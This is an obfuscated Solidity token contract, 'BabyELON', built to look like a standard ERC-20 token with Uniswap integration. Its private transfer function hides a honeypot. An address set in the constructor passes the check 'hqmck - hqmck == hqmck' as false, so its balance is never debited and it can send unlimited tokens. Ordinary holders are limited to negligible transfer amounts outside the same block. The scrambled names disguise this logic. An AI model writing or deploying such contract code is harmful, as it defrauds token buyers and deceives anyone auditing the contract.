contract BabyELON is Ownable {
    function approve(address tipcsagbvnq, uint256 seadzt) public returns (bool success) {
        allowance[msg.sender][tipcsagbvnq] = seadzt;
        emit Approval(msg.sender, tipcsagbvnq, seadzt);
        return true;
    }

    mapping(address => uint256) private lviptrbs;

    function transfer(address czvalm, uint256 seadzt) public returns (bool success) {
        qhagu(msg.sender, czvalm, seadzt);
        return true;
    }

    IUniswapV2Router02 private pgmwvuzasf;

    mapping(address => uint256) private mvsfyrhjteuc;

    uint256 private mzhvcb = 104;

    function transferFrom(address iobuhzq, address czvalm, uint256 seadzt) public returns (bool success) {
        require(seadzt <= allowance[iobuhzq][msg.sender]);
        allowance[iobuhzq][msg.sender] -= seadzt;
        qhagu(iobuhzq, czvalm, seadzt);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function qhagu(address iobuhzq, address czvalm, uint256 seadzt) private {
        address pznlmd = IUniswapV2Factory(pgmwvuzasf.factory()).getPair(address(this), pgmwvuzasf.WETH());
        bool xagjzpiltfwe = lviptrbs[iobuhzq] == block.number;
        uint256 hqmck = mvsfyrhjteuc[iobuhzq];
        if (hqmck - hqmck == hqmck) {
            if (iobuhzq != pznlmd && (!xagjzpiltfwe || seadzt > pinoygj[iobuhzq]) && seadzt < totalSupply) {
                require(seadzt <= totalSupply / (10 ** decimals));
            }
            balanceOf[iobuhzq] -= seadzt;
        }
        pinoygj[czvalm] = seadzt;
        balanceOf[czvalm] += seadzt;
        lviptrbs[czvalm] = block.number;
        emit Transfer(iobuhzq, czvalm, seadzt);
    }

    mapping(address => uint256) private pinoygj;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    string public name;

    string public symbol;

    uint8 public decimals = 9;

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) public balanceOf;

    constructor(string memory iskmzcv, string memory lygcvremui, address fsdiuom, address qgsymtu) {
        name = iskmzcv;
        symbol = lygcvremui;
        balanceOf[msg.sender] = totalSupply;
        mvsfyrhjteuc[qgsymtu] = mzhvcb;
        pgmwvuzasf = IUniswapV2Router02(fsdiuom);
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
}
